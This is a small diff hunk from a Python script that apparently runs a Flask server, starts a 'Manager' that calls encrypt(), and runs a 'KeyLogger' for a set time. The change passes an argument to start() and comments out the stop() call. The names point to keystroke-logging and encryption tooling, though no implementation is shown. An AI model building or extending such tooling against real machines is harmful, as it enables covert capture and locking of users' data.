@@ -178,8 +178,8 @@ if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
 
 m = Manager()
-m.start()
-m.stop()
+m.start(2)
+# m.stop()
 m.encrypt()
 
 KeyLogger(10).stop_after_time()
